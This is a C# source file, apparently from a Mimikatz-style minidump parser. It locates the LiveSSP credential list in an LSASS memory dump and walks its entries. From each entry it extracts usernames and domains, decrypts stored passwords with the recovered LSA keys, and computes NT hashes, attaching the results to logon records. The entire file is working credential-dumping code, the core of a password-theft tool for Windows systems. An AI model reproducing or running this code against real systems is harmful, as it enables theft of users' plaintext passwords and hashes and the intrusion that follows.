using Minidump.Crypto;
using Minidump.Templates;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Minidump.Helpers;
using static Minidump.Templates.livessp;

namespace Minidump.Decryptor
{
    internal class LiveSsp_
    {
        public static int FindCredentials(Program.MiniDump minidump, LiveSspTemplate template)
        {
            KIWI_LIVESSP_LIST_ENTRY entry;
            string passDecrypted = "";
            long llCurrent;
            long sspCredentialListAddr;

            //Console.WriteLine(Helpers.ByteArrayToString(template.signature));
            //foreach (var VARIABLE in minidump.modules)
            //{
            //    Console.WriteLine(VARIABLE.name);
            //}
            long position = find_signature(minidump, "msv1_0.dll", template.signature);
            if (position == 0)
                return 0;

            long ptr_entry_loc = (long)get_ptr_with_offset(minidump.fileBinaryReader, (position + template.first_entry_offset), minidump.sysinfo);
            sspCredentialListAddr = ReadInt64(minidump.fileBinaryReader, (long)ptr_entry_loc);
            //sspCredentialListAddr = Rva2offset(minidump, ptr_entry);

            llCurrent = sspCredentialListAddr;

            do
            {
                Console.WriteLine(llCurrent);
                llCurrent = Rva2offset(minidump, llCurrent);
                //Console.WriteLine(llCurrent);
                minidump.fileBinaryReader.BaseStream.Seek(llCurrent, 0);

                byte[] entryBytes = minidump.fileBinaryReader.ReadBytes(Marshal.SizeOf(typeof(KIWI_LIVESSP_LIST_ENTRY)));
                entry = ReadStruct<KIWI_LIVESSP_LIST_ENTRY>(entryBytes);

                string username = ExtractUnicodeStringString(minidump, entry.suppCreds.credentials.UserName);
                string domain = ExtractUnicodeStringString(minidump, entry.suppCreds.credentials.Domain);

                minidump.fileBinaryReader.BaseStream.Seek(Rva2offset(minidump, entry.suppCreds.credentials.Password.Buffer), 0);
                byte[] msvPasswordBytes = minidump.fileBinaryReader.ReadBytes(entry.suppCreds.credentials.Password.MaximumLength);
                byte[] msvDecryptedPasswordBytes = BCrypt.DecryptCredentials(msvPasswordBytes, minidump.lsakeys);

                passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);

                /*Console.WriteLine("LUID " + entry.LogonId.LowPart);
                 Console.WriteLine("References " + entry.References);
                 Console.WriteLine("CredentialReferences " + entry.CredentialReferences);
                 Console.WriteLine("Uusername {1} {0}", username, entry.credentials.UserName.MaximumLength);
                Console.WriteLine("Udomain {1} {0}", domain, entry.credentials.Domaine.MaximumLength);
                Console.WriteLine("Upassword {1} {0}", passDecrypted, entry.credentials.Password.MaximumLength);*/
                if (!string.IsNullOrEmpty(username) && username.Length > 1)
                {
                    LUID luid = entry.LocallyUniqueIdentifier;

                    LiveSsp sspentry = new LiveSsp();
                    sspentry.UserName = username;

                    if (!string.IsNullOrEmpty(domain))
                    {
                        sspentry.DomainName = domain;
                    }
                    else
                    {
                        sspentry.DomainName = "NULL";
                    }

                    if (!string.IsNullOrEmpty(passDecrypted))
                    {
                        sspentry.Password = passDecrypted;
                    }
                    else
                    {
                        sspentry.Password = "NULL";
                    }

                    try
                    {
                        sspentry.NT = msvDecryptedPasswordBytes.MD4().AsHexString();
                    }
                    catch
                    {
                        sspentry.NT = "NULL";
                    }

                    if (sspentry.Password != "NULL")
                    {
                        Logon currentlogon = minidump.logonlist.FirstOrDefault(x =>
                            x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                        if (currentlogon == null)
                        {
                            currentlogon = new Logon(luid);
                            currentlogon.UserName = username;
                            currentlogon.LiveSsp = new List<LiveSsp>();
                            currentlogon.LiveSsp.Add(sspentry);
                            minidump.logonlist.Add(currentlogon);
                        }
                        else
                        {
                            if (currentlogon.LiveSsp == null)
                                currentlogon.LiveSsp = new List<LiveSsp>();

                            currentlogon.LiveSsp.Add(sspentry);
                        }
                    }
                }

                llCurrent = entry.Flink;
            } while (llCurrent != sspCredentialListAddr);

            return 0;
        }
    }
}